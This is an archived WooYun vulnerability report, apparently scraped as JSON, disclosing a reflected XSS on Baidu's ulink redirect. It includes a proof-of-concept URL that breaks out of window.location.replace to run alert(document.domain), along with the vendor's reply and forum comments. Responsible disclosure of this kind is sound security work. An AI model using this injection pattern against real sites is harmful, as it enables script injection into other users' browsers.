{"id": 4407, "wybug_id": "wooyun-2014-054435", "wybug_title": "百度主站反射型XSS", "wybug_corp": "百度", "wybug_author": "mramydnei", "wybug_date": "2014-03-24 02:03", "wybug_open_date": "2014-05-08 02:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-08：\t细节向公众公开  简要描述： 很低级的错误 详细说明：  下歌词的时候，无意中发现的。以下面的URL为例：\nhttp://www.baidu.com/ulink?url=http%3A%2F%2Fmusic.baidu.com%2F%2Fdata2%2Flrc%2F34272020%2F34272020.lrc%3Ffm%3Daltg5&wd=lose%20yourself%E6%AD%8C%E8%AF%8D&&tn=baidu&&ie=utf-8&&&&oq=lose%20yourse&&f=3&rsp=1&inputT=11\n这里的参数url的值，最后会传递到window.location.replace里面\n<script>window.location.replace(\"http://music.baidu.com//data2/lrc/34272020/34272020.lrc?fm=altg5\")</script>\n这里有对http://music.baidu.com//data2/lrc/34272020/34272020.lrc这个文件的存在与否做了判断，但是可以在后面的参数上做文章。比如：\nhttp://www.baidu.com/ulink?url=http%3A%2F%2Fmusic.baidu.com%2F%2Fdata2%2Flrc%2F34272020%2F34272020.lrc%3Ffm%3Daltg5%22%29;alert%28document.domain%29;//&wd=lose%20yourself%E6%AD%8C%E8%AF%8D&&tn=baidu&&ie=utf-8&&&&oq=lose%20yourse&&f=3&rsp=1&inputT=11\n最终变成:\n<script>window.location.replace(\"http://music.baidu.com//data2/lrc/34272020/34272020.lrc?fm=altg5\");alert(document.domain);//\")</script>\n由于是输出在script内的情况，所以浏览器自带的一些XSS filter应该是不会去拦截的。   漏洞证明：  相关贴图：测试于firefox28,chrome33\n\n   修复方案：  escape it   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2014-03-25 08:46 厂商回复： 感谢提交，会尽快处理此问题。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-24 03:20 |    \t\tblack hook \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | 新人、)\t\t \n  前排出售沙发    \n     2014-03-24 06:27 |    \t\t超威蓝猫 \t\t\t( 核心白帽子 |\t\t\t        Rank:1092 漏洞数:117        | STEAM_0:0:55968383)\t\t \n  是??.baidu.com下的吗    \n     2014-03-24 06:47 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  唔...    \n     2014-03-24 07:54 |    \t\t走火入魔 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:2        | 多读书，多看报，少吃零食，多睡觉。)\t\t \n  是搜索的对把     \n     2014-03-24 08:35 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @超威蓝猫 www.baidu.com下的    \n     2014-03-24 08:36 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  mark    \n     2014-03-24 08:36 |    \t\tBloodwolf \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:8        | whoami)\t\t \n  1024    \n     2014-03-24 09:29 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  屌！    \n     2014-03-24 09:44 |    \t\tMaster \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:10        )\t\t \n  我操。。。。最近的洞都很火啊    \n     2014-03-24 11:37 |    \t\tevil_webshell \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 致力于web层面的安全，热爱黑客技术，正在...)\t\t \n  求公开    \n     2014-03-24 18:56 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  javascript:alert(/you are xss god/);    \n     2014-04-13 23:34 |    \t\t小贱人 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 资深菜鸟，)\t\t \n  mark    \n     2014-05-08 10:03 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  主站XSS两分有点低。。。如果利用很鸡肋才给两分的话，也得说明一下啊。    \n     2014-05-18 09:11 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @char 墙内用户不受影响    \n     2014-05-18 09:12 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @char 这也是我后来和他们的工程师沟通过之后才知道的    \n     2014-05-19 10:20 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  @mramydnei 墙内用户是指？    \n     2014-05-19 11:28 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @xiaoL 中华人民共和国境内的用户    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}